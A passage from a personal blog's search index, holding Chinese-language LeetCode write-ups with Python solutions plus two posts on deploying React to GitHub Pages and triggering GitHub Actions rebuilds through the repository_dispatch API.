that the sum is closest to target. Return the sum of the three integers. You may assume that each input would have exactly one solution.\nExample 1:\nInput: nums = [-1,2,1,-4], target = 1Output: 2Explanation: The sum that is closest to the target is 2. (-1 + 2 + 1 = 2). Constraints:\n3 \u003c= nums.length \u003c= 10^3-10^3 \u003c= nums[i] \u003c= 10^3-10^4 \u003c= target \u003c= 10^4 Sol 一般來說提到3sum都是用two ptr的解法延伸\nclass Solution: def threeSumClosest(self, nums: List[int], target: int) -\u0026gt; int: nums.sort() ret = float(\u0026#39;inf\u0026#39;) for i in range(len(nums)): a, b = i+1, len(nums)-1 while a \u0026lt; b: cnt = sum([nums[x] for x in [i,a,b]]) if cnt == target: return cnt else: ret = min([ret,cnt],key=lambda x: abs(x-target)) if cnt \u0026gt; target: b -= 1 else: a += 1 return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-16-3sum-closest/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e3sum的two ptr很重要\u003c/p\u003e","title":"leetcode-16 - 3Sum Closest"},{"content":"動機 題目給的是氣球的寬度\nProblem There are some spherical balloons spread in two-dimensional space. For each balloon, provided input is the start and end coordinates of the horizontal diameter. Since it's horizontal, y-coordinates don't matter, and hence the x-coordinates of start and end of the diameter suffice. The start is always smaller than the end.\nAn arrow can be shot up exactly vertically from different points along the x-axis. A balloon with xstart and xend bursts by an arrow shot at x if xstart ≤ x ≤ xend. There is no limit to the number of arrows that can be shot. An arrow once shot keeps traveling up infinitely.\nGiven an array points where points[i] = [xstart, xend], return the minimum number of arrows that must be shot to burst all balloons.\nExample 1:\nInput: points = [[10,16],[2,8],[1,6],[7,12]]Output: 2Explanation: One way is to shoot one arrow for example at x = 6 (bursting the balloons [2,8] and [1,6]) and another arrow at x = 11 (bursting the other two balloons).Example 2:\nInput: points = [[1,2],[3,4],[5,6],[7,8]]Output: 4Example 3:\nInput: points = [[1,2],[2,3],[3,4],[4,5]]Output: 2 Constraints:\n1 \u003c= points.length \u003c= 104points[i].length == 2-231 \u003c= xstart \u003c xend \u003c= 231 - 1 Sol 如果有一個範圍完整包含另一個，就只要打小的另一個也會被打到\n如果是只有交疊一部份，就是只留交疊的部分\n剩下就只能另外打了\nclass Solution: def findMinArrowShots(self, ps: List[List[int]]) -\u0026gt; int: stk = [] ps.sort(key=lambda x: (x[0], x[1]-x[0])) #print(ps) stk.append(ps[0]) for (a,b) in ps[1:]: x,y = stk[-1] if x \u0026lt;= a \u0026lt;= y and x \u0026lt;= b \u0026lt;= y: stk.pop() stk.append([a,b]) elif x \u0026lt;= a \u0026lt;= y: stk.pop() stk.append([a,y]) else: stk.append([a,b]) return len(stk) ","permalink":"https://littlebees.github.io/2021/07/leetcode-452-minimum-number-of-arrows-to-burst-balloons/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e題目給的是氣球的寬度\u003c/p\u003e","title":"leetcode-452 - Minimum Number of Arrows to Burst Balloons"},{"content":"動機 這種題目是不是就是saddleback就好了\nProblem Write an efficient algorithm that searches for a value in an m x n matrix. This matrix has the following properties:\nIntegers in each row are sorted from left to right.The first integer of each row is greater than the last integer of the previous row. Example 1:\nInput: matrix = [[1,3,5,7],[10,11,16,20],[23,30,34,60]], target = 3Output: trueExample 2:\nInput: matrix = [[1,3,5,7],[10,11,16,20],[23,30,34,60]], target = 13Output: false Constraints:\nm == matrix.lengthn == matrix[i].length1 \u003c= m, n \u003c= 100-104 \u003c= matrix[i][j], target \u003c= 104 Sol class Solution: def searchMatrix(self, mx: List[List[int]], target: int) -\u0026gt; bool: a,b = len(mx)-1, 0 while 0 \u0026lt;= a \u0026lt; len(mx) and 0 \u0026lt;= b \u0026lt; len(mx[a]): if mx[a][b] == target: return True elif mx[a][b] \u0026gt; target: a -= 1 else: b += 1 return False ","permalink":"https://littlebees.github.io/2021/07/leetcode-74-search-a-2d-matrix/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這種題目是不是就是saddleback就好了\u003c/p\u003e","title":"leetcode-74 - Search a 2D Matrix"},{"content":"動機 就reverse\nProblem Given the head of a singly linked list and two integers left and right where left \u003c= right, reverse the nodes of the list from position left to position right, and return the reversed list.\nExample 1:\nInput: head = [1,2,3,4,5], left = 2, right = 4Output: [1,4,3,2,5]Example 2:\nInput: head = [5], left = 1, right = 1Output: [5] Constraints:\nThe number of nodes in the list is n.1 \u003c= n \u003c= 500-500 \u003c= Node.val \u003c= 5001 \u003c= left \u003c= right \u003c= n Follow up: Could you do it in one pass? Sol def help(i,j): new_goal = i k = i.next while k!=j: tmp = k.next k.next = i i = k k = tmp new_goal.next = j return i class Solution: def reverseBetween(self, head: ListNode, m: int, n: int) -\u0026gt; ListNode: a = head prev = head for _ in range(0,m-1): if a: prev = a a = a.next else: break b = a for _ in range(0,n-m): if b: b = b.next else: break if b: b = b.next if a == head: return help(a,b) else: prev.next = help(a,b) return head ","permalink":"https://littlebees.github.io/2021/07/leetcode-92-reverse-linked-list-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就reverse\u003c/p\u003e","title":"leetcode-92 - Reverse Linked List II"},{"content":"動機 dp的比較好理解\nProblem Given an integer array nums, return the number of longest increasing subsequences.\nNotice that the sequence has to be strictly increasing.\nExample 1:\nInput: nums = [1,3,5,4,7]Output: 2Explanation: The two longest increasing subsequences are [1, 3, 4, 7] and [1, 3, 5, 7].Example 2:\nInput: nums = [2,2,2,2,2]Output: 5Explanation: The length of longest continuous increasing subsequence is 1, and there are 5 subsequences' length is 1, so output 5. Constraints:\n1 \u003c= nums.length \u003c= 2000-106 \u003c= nums[i] \u003c= 106 Sol 在dp時留一個紀錄總數的位置\nclass Solution: def findNumberOfLIS(self, nums: List[int]) -\u0026gt; int: @cache def dp(i): if i == 0: return [1,1] # len, cnt else: ls = [dp(x) for x in range(i) if nums[x] \u0026lt; nums[i]] l = max(ls,key=itemgetter(0),default=[0])[0] cnt = max(1,sum([x[1] for x in ls if x[0] == l], 0)) return [l+1, cnt] dps = [dp(i) for i in range(len(nums))] maxlen = max(dps,key=itemgetter(0))[0] #print(dps) return sum([x[1] for x in dps if x[0] == maxlen]) Case Study 另外有一個patience sort的作法，這裡，之後有時間來研究\n","permalink":"https://littlebees.github.io/2021/07/leetcode-673-number-of-longest-increasing-subsequence/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003edp的比較好理解\u003c/p\u003e","title":"leetcode-673 - Number of Longest Increasing Subsequence"},{"content":"動機 這比上一題(40)簡單\nProblem Find all valid combinations of k numbers that sum up to n such that the following conditions are true:\nOnly numbers 1 through 9 are used.Each number is used at most once.Return a list of all possible valid combinations. The list must not contain the same combination twice, and the combinations may be returned in any order.\nExample 1:\nInput: k = 3, n = 7Output: [[1,2,4]]Explanation:1 + 2 + 4 = 7There are no other valid combinations.Example 2:\nInput: k = 3, n = 9Output: [[1,2,6],[1,3,5],[2,3,4]]Explanation:1 + 2 + 6 = 91 + 3 + 5 = 92 + 3 + 4 = 9There are no other valid combinations.Example 3:\nInput: k = 4, n = 1Output: []Explanation: There are no valid combinations.Using 4 different numbers in the range [1,9], the smallest sum we can get is 1+2+3+4 = 10 and since 10 \u003e 1, there are no valid combination.Example 4:\nInput: k = 3, n = 2Output: []Explanation: There are no valid combinations.Example 5:\nInput: k = 9, n = 45Output: [[1,2,3,4,5,6,7,8,9]]Explanation:1 + 2 + 3 + 4 + 5 + 6 + 7 + 8 + 9 = 45There are no other valid combinations. Constraints:\n2 \u003c= k \u003c= 91 \u003c= n \u003c= 60 Sol class Solution: def combinationSum3(self, k: int, n: int) -\u0026gt; List[List[int]]: def bt(nums, acc, cnt, k): if k == 0 and cnt == n: return [acc] elif cnt \u0026gt; n or not nums or k \u0026lt; 0: return [] else: return bt(nums[1:], acc+[nums[0]], cnt+nums[0], k-1) + bt(nums[1:], acc, cnt, k) return bt(list(range(1,10)), [], 0, k) ","permalink":"https://littlebees.github.io/2021/07/leetcode-216-combination-sum-iii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這比上一題(\u003ca href=\"/2021/07/leetcode-40\"\u003e40\u003c/a\u003e)簡單\u003c/p\u003e","title":"leetcode-216 - Combination Sum III"},{"content":"動機 處理backtrack的重複就是在同一層展開完，再到下一層去\nProblem Given a collection of candidate numbers (candidates) and a target number (target), find all unique combinations in candidates where the candidate numbers sum to target.\nEach number in candidates may only be used once in the combination.\nNote: The solution set must not contain duplicate combinations.\nExample 1:\nInput: candidates = [10,1,2,7,6,1,5], target = 8Output: [[1,1,6],[1,2,5],[1,7],[2,6]]Example 2:\nInput: candidates = [2,5,2,1,2], target = 5Output: [[1,2,2],[5]] Constraints:\n1 \u003c= candidates.length \u003c= 1001 \u003c= candidates[i] \u003c= 501 \u003c= target \u003c= 30 Sol class Solution: def combinationSum2(self, cs: List[int], val: int) -\u0026gt; List[List[int]]: def bt(cs,acc,cnt): if val == cnt: return [acc] elif cnt \u0026gt; val or not cs: return [] else: now = cs[0] j = bisect_right(cs,now) return sum([bt(cs[j:],acc+([now]*i),cnt+now*i) for i in range(j+1)],[]) cs.sort() return bt(cs,[],0) ","permalink":"https://littlebees.github.io/2021/07/leetcode-40-combination-sum-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e處理backtrack的重複就是在同一層展開完，再到下一層去\u003c/p\u003e","title":"leetcode-40 - Combination Sum II"},{"content":"動機 人生第一次用狀態壓縮\nProblem Given an integer array nums and an integer k, return true if it is possible to divide this array into k non-empty subsets whose sums are all equal.\nExample 1:\nInput: nums = [4,3,2,3,5,2,1], k = 4Output: trueExplanation: It's possible to divide it into 4 subsets (5), (1, 4), (2,3), (2,3) with equal sums.Example 2:\nInput: nums = [1,2,3,4], k = 3Output: false Constraints:\n1 \u003c= k \u003c= nums.length \u003c= 161 \u003c= nums[i] \u003c= 104The frequency of each element is in the range [1, 4]. Sol 去湊，湊完就繼續往下再湊\nclass Solution: def canPartitionKSubsets(self, nums: List[int], k: int) -\u0026gt; bool: cnt = sum(nums) if cnt % k != 0: return False else: cnt = cnt // k @cache def dp(tbl,acc=0): if tbl == 0: return (acc == cnt) elif acc \u0026gt; cnt: return False elif acc == cnt: return dp(tbl,0) else: cs = [i for i in range(len(nums)) if (tbl \u0026amp; (1 \u0026lt;\u0026lt; i)) != 0] return any([dp(tbl \u0026amp; ~(1 \u0026lt;\u0026lt; i), acc+nums[i]) for i in cs]) return dp(2**(len(nums))-1) ","permalink":"https://littlebees.github.io/2021/07/leetcode-698-partition-to-k-equal-sum-subsets/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e人生第一次用狀態壓縮\u003c/p\u003e","title":"leetcode-698 - Partition to K Equal Sum Subsets"},{"content":"動機 複習upper bound\nProblem Given a characters array letters that is sorted in non-decreasing order and a character target, return the smallest character in the array that is larger than target.\nNote that the letters wrap around.\nFor example, if target == 'z' and letters == ['a', 'b'], the answer is 'a'. Example 1:\nInput: letters = [c,f,j], target = aOutput: cExample 2:\nInput: letters = [c,f,j], target = cOutput: fExample 3:\nInput: letters = [c,f,j], target = dOutput: fExample 4:\nInput: letters = [c,f,j], target = gOutput: jExample 5:\nInput: letters = [c,f,j], target = jOutput: c Constraints:\n2 \u003c= letters.length \u003c= 104letters[i] is a lowercase English letter.letters is sorted in non-decreasing order.letters contains at least two different characters.target is a lowercase English letter. Sol class Solution: def nextGreatestLetter(self, letters: List[str], target: str) -\u0026gt; str: i = bisect_right(letters, target) return letters[i] if i \u0026lt; len(letters) else letters[0] ","permalink":"https://littlebees.github.io/2021/07/leetcode-744-find-smallest-letter-greater-than-target/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習upper bound\u003c/p\u003e","title":"leetcode-744 - Find Smallest Letter Greater Than Target"},{"content":"動機 複習bsearch\nProblem Given an array of integers nums which is sorted in ascending order, and an integer target, write a function to search target in nums. If target exists, then return its index. Otherwise, return -1.\nYou must write an algorithm with O(log n) runtime complexity.\nExample 1:\nInput: nums = [-1,0,3,5,9,12], target = 9Output: 4Explanation: 9 exists in nums and its index is 4Example 2:\nInput: nums = [-1,0,3,5,9,12], target = 2Output: -1Explanation: 2 does not exist in nums so return -1 Constraints:\n1 \u003c= nums.length \u003c= 104-104 \u003c nums[i], target \u003c 104All the integers in nums are unique.nums is sorted in ascending order. Sol class Solution: def search(self, nums: List[int], target: int) -\u0026gt; int: i = bisect_left(nums,target) return i if i \u0026lt; len(nums) and nums[i] == target else -1 ","permalink":"https://littlebees.github.io/2021/07/leetcode-704-binary-search/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習bsearch\u003c/p\u003e","title":"leetcode-704 - Binary Search"},{"content":"動機 複習backtrack\nProblem Given a string s, we can transform every letter individually to be lowercase or uppercase to create another string.\nReturn a list of all possible strings we could create. You can return the output in any order.\nExample 1:\nInput: s = a1b2Output: [a1b2,a1B2,A1b2,A1B2]Example 2:\nInput: s = 3z4Output: [3z4,3Z4]Example 3:\nInput: s = 12345Output: [12345]Example 4:\nInput: s = 0Output: [0] Constraints:\ns will be a string with length between 1 and 12.s will consist only of letters or digits. Sol class Solution: def letterCasePermutation(self, s: str,acc=\u0026#34;\u0026#34;) -\u0026gt; List[str]: if not s: return [acc] elif s[0].isalpha(): return self.letterCasePermutation(s[1:],acc+s[0].lower())+self.letterCasePermutation(s[1:],acc+s[0].upper()) else: return self.letterCasePermutation(s[1:],acc+s[0]) ","permalink":"https://littlebees.github.io/2021/07/leetcode-784-letter-case-permutation/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習backtrack\u003c/p\u003e","title":"leetcode-784 - Letter Case Permutation"},{"content":"動機 沒看清楚功能要求吃了3個WA\nProblem Design a map that allows you to do the following:\nMaps a string key to a given value.Returns the sum of the values that have a key with a prefix equal to a given string.Implement the MapSum class:\nMapSum() Initializes the MapSum object.void insert(String key, int val) Inserts the key-val pair into the map. If the key already existed, the original key-value pair will be overridden to the new one.int sum(string prefix) Returns the sum of all the pairs' value whose key starts with the prefix. Example 1:\nInput[MapSum, insert, sum, insert, sum][[], [apple, 3], [ap], [app, 2], [ap]]Output[null, null, 3, null, 5]ExplanationMapSum mapSum = new MapSum();mapSum.insert(apple, 3); mapSum.sum(ap); // return 3 (apple = 3)mapSum.insert(app, 2); mapSum.sum(ap); // return 5 (apple + app = 3 + 2 = 5) Constraints:\n1 \u003c= key.length, prefix.length \u003c= 50key and prefix consist of only lowercase English letters.1 \u003c= val \u003c= 1000At most 50 calls will be made to insert and sum. Sol 就是Trie，但是要有特別的dfs\nclass Trie: def __init__(self): self.chars = {} self.val = 0 def insert(self,s,v): if not s: self.val = v else: if s[0] not in self.chars: self.chars[s[0]] = Trie() self.chars[s[0]].insert(s[1:], v) def pxsum(self,px,acc=0): if not px: return acc+sum([self.chars[k].pxsum(\u0026#34;\u0026#34;)+self.chars[k].val for k in self.chars],0) elif px[0] in self.chars: return self.chars[px[0]].pxsum(px[1:],acc+self.chars[px[0]].val if len(px) == 1 else 0) else: return 0 class MapSum: def __init__(self): self.trie = Trie() def insert(self, key: str, val: int) -\u0026gt; None: self.trie.insert(key,val) def sum(self, prefix: str) -\u0026gt; int: return self.trie.pxsum(prefix) ","permalink":"https://littlebees.github.io/2021/07/leetcode-677-map-sum-pairs/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e沒看清楚功能要求吃了3個WA\u003c/p\u003e","title":"leetcode-677 - Map Sum Pairs"},{"content":"動機 忘了可以上index，要算距離就是index!!\nProblem Given the root of a binary tree, return the maximum width of the given tree.\nThe maximum width of a tree is the maximum width among all levels.\nThe width of one level is defined as the length between the end-nodes (the leftmost and rightmost non-null nodes), where the null nodes between the end-nodes are also counted into the length calculation.\nIt is guaranteed that the answer will in the range of 32-bit signed integer.\nExample 1:\nInput: root = [1,3,2,5,3,null,9]Output: 4Explanation: The maximum width existing in the third level with the length 4 (5,3,null,9).Example 2:\nInput: root = [1,3,null,5,3]Output: 2Explanation: The maximum width existing in the third level with the length 2 (5,3).Example 3:\nInput: root = [1,3,2,5]Output: 2Explanation: The maximum width existing in the second level with the length 2 (3,2).Example 4:\nInput: root = [1,3,2,5,null,null,9,6,null,null,7]Output: 8Explanation: The maximum width existing in the fourth level with the length 8 (6,null,null,null,null,null,null,7). Constraints:\nThe number of nodes in the tree is in the range [1, 3000].-100 \u003c= Node.val \u003c= 100 Sol 把tree每一level去編index\n0 0 1 0 1 2 3 就能推出i*2與i*2+1這兩個規則\nclass Solution: def widthOfBinaryTree(self, root: TreeNode) -\u0026gt; int: starts,ret = {},1 def dfs(r,level=0,i=0): nonlocal ret if not r: return else: if level not in starts: starts[level] = i else: ret = max(ret, i-starts[level]+1) dfs(r.left,level+1,i*2) dfs(r.right,level+1,i*2+1) dfs(root) return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-662-maximum-width-of-binary-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e忘了可以上index，要算距離就是index!!\u003c/p\u003e","title":"leetcode-662 - Maximum Width of Binary Tree"},{"content":"動機 最初是為了使用同一個data source去生不同版本resume，所以研究怎麼用reactjs與github page，這裡說說遇到的坑\n困難點 設計遞迴結構 同樣的結構，但是因為位置不同需要的render也不一樣，所以要想辦法讓轉換器知道該換成什麼 這裡的方法是，在json的key放不同的string，以區分不同的case 之後還要讓其他遞迴照常運行 不過這樣讓整個JSON不好被操作 自動deploy到blog 把build出來的檔案copy到另一個branch去 - 原本想用copy之類的action自己用，都一直出事 - 最後是改用deploy github page的action就直接ok submodule怎麼更新 - git submodule update --init --recursive是拉檔案 - git submodule add -b BRANCH URL的添加方法不會自動更新submodule - git submodule update --remote --recursive才會更新!! 在react build完時deploy到blog，讓他rebuild - 我是用submodule讓react與blog共用同一個domain - 但需要在react build完時讓blog rebuild去拉新submodule - 所以要讓blog有辦法被call去rebuild，方法在另一篇 讓同一個網頁依據不同網址顯示不同版本的網頁 用react router，但是如果直接上github page，打不同網址就會報404，所以要用HashRouter react會亂call reactjs處理component不是轉成html就沒了，會在不知情時被call 所以在json上遞迴的時候偶而input會是undefined，這個要處理 如果在array加東西是直接push，可能會看到被多push一次 所以還要去判斷被push的東西在不在array中 錯誤 修改data source十分沒效率 雖然是用json存資料，但是json有很多key是為了轉換器而生，所以要做刪除或是新增就會很麻煩 每做一次就要重新找要操作的位置，就要重新遞迴找index reactjs的cache 刪除或是新增json，在build出來的production沒辦法直接反應， 但這應該與reactjs的cache有關，還要去看 代辦事項 設計更好懂的結構 讓json跟好懂，把為了轉換器而生的key去掉，這樣操作data source的效率會好很多 熟悉reactjs，處理前面奇怪的bug 最初用reactjs就是當成html compiler而已 但reactjs有自己處理component的方法，要去研讀這一段 ","permalink":"https://littlebees.github.io/2021/07/%E5%9C%A8github-page%E4%B8%8A%E7%94%A8reactjs/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e最初是為了使用同一個data source去生不同版本resume，所以研究怎麼用reactjs與github page，這裡說說遇到的坑\u003c/p\u003e","title":"在github page上用reactjs"},{"content":"動機 因為另一個project的需求 需要CI可以透過web api來rebuild，所以就換到github action了\nrepository_dispatch 可以自訂type，就可以透過curl去打API\n在yaml中放repository_dispatch\non: repository_dispatch: types: rebuild 這樣就可以用curl讓github action啟動\ncurl -H \u0026#34;Accept: application/vnd.github.v3+json\u0026#34; \\ -H \u0026#34;Authorization: token $MY_SECRET\u0026#34; \\ --request POST \\ --data \u0026#39;{\u0026#34;event_type\u0026#34;: \u0026#34;rebuild\u0026#34;}\u0026#39; \\ https://api.github.com/repos/name/repo/dispatches 如果要帶env\n- env: MY_SECRET: ${{ secrets.PERSONAL_TOKEN }} run: | curl -H \u0026#34;Accept: application/vnd.github.v3+json\u0026#34; \\ -H \u0026#34;Authorization: token $MY_SECRET\u0026#34; \\ --request POST \\ --data \u0026#39;{\u0026#34;event_type\u0026#34;: \u0026#34;rebuild\u0026#34;}\u0026#39; \\ https://api.github.com/repos/name/repo/dispatches ","permalink":"https://littlebees.github.io/2021/07/%E9%80%8F%E9%81%8Ewebhook%E8%AE%93github-actions-rebuild/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e因為另一個project的需求\n需要CI可以透過web api來rebuild，所以就換到github action了\u003c/p\u003e","title":"透過webhook讓github actions rebuild"},{"content":"動機 又一個有趣的手法\nProblem Given an integer array nums of length n where all the integers of nums are in the range [1, n] and each integer appears once or twice, return an array of all the integers that appears twice.\nYou must write an algorithm that runs in O(n) time and uses only constant extra space.\nExample 1:\nInput: nums = [4,3,2,7,8,2,3,1]Output: [2,3]Example 2:\nInput: nums = [1,1,2]Output: [1]Example 3:\nInput: nums = [1]Output: [] Constraints:\nn == nums.length1 \u003c= n \u003c= 1051 \u003c= nums[i] \u003c= nEach element in nums appears once or twice. Sol 因為資料與index只差1，所以可以一直把資料換到對的位置，最後走一遍看哪裡出事\nclass Solution: def findDuplicates(self, nums: List[int]) -\u0026gt; List[int]: for i in range(len(nums)): while i != nums[i]-1 and nums[i] != nums[nums[i]-1]: nums[nums[i]-1], nums[i] = nums[i], nums[nums[i]-1] #print(nums) return [v for (_,v) in filter(lambda iv: iv[0]+1 != iv[1], enumerate(nums))] ","permalink":"https://littlebees.github.io/2021/07/leetcode-442-find-all-duplicates-in-an-array/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e又一個有趣的手法\u003c/p\u003e","title":"leetcode-442 - Find All Duplicates in an Array"},{"content":"動機 複習stack，但第二個解法很漂亮\nProblem Given two strings s and t, return true if they are equal when both are typed into empty text editors. '#' means a backspace character.\nNote that after backspacing an empty text, the text will continue empty.\nExample 1:\nInput: s = ab#c, t = ad#cOutput: trueExplanation: Both s and t become ac.Example 2:\nInput: s = ab##, t = c#d#Output: trueExplanation: Both s and t become .Example 3:\nInput: s = a##c, t = #a#cOutput: trueExplanation: Both s and t become c.Example 4:\nInput: s = a#c, t = bOutput: falseExplanation: s becomes c while t becomes b. Constraints:\n1 \u003c= s.length, t.length \u003c= 200s and t only contain lowercase letters and '#' characters. Follow up: Can you solve it in O(n) time and O(1) space?\nSol 無腦stack\nclass Solution: def backspaceCompare(self, s: str, t: str) -\u0026gt; bool: stk = [] for c in s: if c == \u0026#34;#\u0026#34;: if stk: stk.pop() else: stk.append(c) s = \u0026#39;\u0026#39;.join(stk) stk = [] for c in t: if c == \u0026#34;#\u0026#34;: if stk: stk.pop() else: stk.append(c) t = \u0026#39;\u0026#39;.join(stk) return s==t 有一個類似moore voting的手法\nclass Solution(object): def backspaceCompare(self, S, T): def F(S): skip = 0 for x in reversed(S): if x == \u0026#39;#\u0026#39;: skip += 1 elif skip: skip -= 1 else: yield x return all(x == y for x, y in itertools.izip_longest(F(S), F(T))) ","permalink":"https://littlebees.github.io/2021/07/leetcode-844-backspace-string-compare/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習stack，但第二個解法很漂亮\u003c/p\u003e","title":"leetcode-844 - Backspace String Compare"},{"content":"動機 複習bfs\nProblem Given the root of a binary tree, return the average value of the nodes on each level in the form of an array. Answers within 10-5 of the actual answer will be accepted. Example 1:\nInput: root = [3,9,20,null,15,7]Output: [3.00000,14.50000,11.00000]Explanation: The average value of nodes on level 0 is 3, on level 1 is 14.5, and on level 2 is 11.Hence return [3, 14.5, 11].Example 2:\n\u0026lt;img alt=\u0026quot;\u0026quot; src=\u0026ldquo;https://assets.leetcode.com/uploads/2021/03/09/avg2-tree.jpg \u0026ldquo;style=\u0026ldquo;width: 292px; height: 302px;\u0026rdquo; /\u0026gt;Input: root = [3,9,20,15,7]Output: [3.00000,14.50000,11.00000] Constraints:\nThe number of nodes in the tree is in the range [1, 104].-231 \u0026lt;= Node.val \u0026lt;= 231 - 1\nSol class Solution: def averageOfLevels(self, root: TreeNode) -\u0026gt; List[float]: q = deque([[root]]) ret = [] while q: rs = q.popleft() ret.append(sum([r.val for r in rs])/len(rs)) next_rs = sum([[r.left, r.right] for r in rs],[]) next_rs = [r for r in next_rs if r] if next_rs: q.append(next_rs) return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-637-average-of-levels-in-binary-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習bfs\u003c/p\u003e","title":"leetcode-637 - Average of Levels in Binary Tree"},{"content":"動機 複習Linked list的remove\nProblem Given the head of a linked list and an integer val, remove all the nodes of the linked list that has Node.val == val, and return the new head.\nExample 1:\nInput: head = [1,2,6,3,4,5,6], val = 6Output: [1,2,3,4,5]Example 2:\nInput: head = [], val = 1Output: []Example 3:\nInput: head = [7,7,7,7], val = 7Output: [] Constraints:\nThe number of nodes in the list is in the range [0, 104].1 \u003c= Node.val \u003c= 500 \u003c= val \u003c= 50 Sol class Solution: def removeElements(self, head: ListNode, val: int) -\u0026gt; ListNode: if head: prev, ret = None, head while ret and ret.val == val: ret = ret.next cur = ret while cur: if cur.val == val: prev.next = cur.next else: prev = cur cur = cur.next return ret else: return head ","permalink":"https://littlebees.github.io/2021/07/leetcode-203-remove-linked-list-elements/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習Linked list的remove\u003c/p\u003e","title":"leetcode-203 - Remove Linked List Elements"},{"content":"動機 複習linked list找中點\nProblem Given the head of a singly linked list, return the middle node of the linked list.\nIf there are two middle nodes, return the second middle node.\nExample 1:\nInput: head = [1,2,3,4,5]Output: [3,4,5]Explanation: The middle node of the list is node 3.Example 2:\nInput: head = [1,2,3,4,5,6]Output: [4,5,6]Explanation: Since the list has two middle nodes with values 3 and 4, we return the second one. Constraints:\nThe number of nodes in the list is in the range [1, 100].1 \u003c= Node.val \u003c= 100 Sol class Solution: def middleNode(self, head: ListNode) -\u0026gt; ListNode: end = head while end.next and end.next.next: head, end = head.next, end.next.next if end.next: return head.next else: return head ","permalink":"https://littlebees.github.io/2021/07/leetcode-876-middle-of-the-linked-list/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習linked list找中點\u003c/p\u003e","title":"leetcode-876 - Middle of the Linked List"},{"content":"動機 複習prefix sum\nProblem Given an integer array nums, handle multiple queries of the following type:\nCalculate the sum of the elements of nums between indices left and right inclusive where left \u003c= right.Implement the NumArray class:\nNumArray(int[] nums) Initializes the object with the integer array nums.int sumRange(int left, int right) Returns the sum of the elements of nums between indices left and right inclusive (i.e. nums[left] + nums[left + 1] + ... + nums[right]). Example 1:\nInput[NumArray, sumRange, sumRange, sumRange][[[-2, 0, 3, -5, 2, -1]], [0, 2], [2, 5], [0, 5]]Output[null, 1, -1, -3]ExplanationNumArray numArray = new NumArray([-2, 0, 3, -5, 2, -1]);numArray.sumRange(0, 2); // return (-2) + 0 + 3 = 1numArray.sumRange(2, 5); // return 3 + (-5) + 2 + (-1) = -1numArray.sumRange(0, 5); // return (-2) + 0 + 3 + (-5) + 2 + (-1) = -3 Constraints:\n1 \u003c= nums.length \u003c= 104-105 \u003c= nums[i] \u003c= 1050 \u003c= left \u003c= right \u003c nums.lengthAt most 104 calls will be made to sumRange. Sol class NumArray: def __init__(self, nums: List[int]): tmp = [0] for n in nums: tmp.append(n+tmp[-1]) self.sums = tmp def sumRange(self, left: int, right: int) -\u0026gt; int: return self.sums[right+1]-self.sums[left] ","permalink":"https://littlebees.github.io/2021/07/leetcode-303-range-sum-query-immutable/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習prefix sum\u003c/p\u003e","title":"leetcode-303 - Range Sum Query - Immutable"},{"content":"動機 忘了bucket sort 在python用[0]*n通常下場都不好，要改用dict sort還是比較厲害 Problem Given an integer array nums, return the maximum difference between two successive elements in its sorted form. If the array contains less than two elements, return 0.\nYou must write an algorithm that runs in linear time and uses linear extra space.\nExample 1:\nInput: nums = [3,6,9,1]Output: 3Explanation: The sorted form of the array is [1,3,6,9], either (3,6) or (6,9) has the maximum difference 3.Example 2:\nInput: nums = [10]Output: 0Explanation: The array contains less than 2 elements, therefore return 0. Constraints:\n1 \u003c= nums.length \u003c= 1050 \u003c= nums[i] \u003c= 109 Sol bucket sort就是把list，分堆，放到bucket中\n所以這裡要根據數字的範圍，分到array的孔去，就是下面的B_len 但要注意可能是0，像[1,1,1]\nclass Solution: def maximumGap(self, nums): if len(nums) \u0026lt;= 2: return max(nums)-min(nums) mi = min(nums) nums = [n-mi for n in nums] val_len = max(nums) B_len = val_len//len(nums) B_len = B_len if B_len \u0026gt; 0 else 1 Bmax = defaultdict(lambda : float(\u0026#39;-inf\u0026#39;)) Bmin = defaultdict(lambda : float(\u0026#39;inf\u0026#39;)) for n in nums: i = n//B_len Bmax[i] = max(Bmax[i], n) Bmin[i] = min(Bmin[i], n) ret,pre = 0,0 for i in range(1,len(nums)+1): if i in Bmin: ret = max(ret, Bmin[i]-Bmax[pre]) pre = i return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-164-maximum-gap/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e忘了bucket 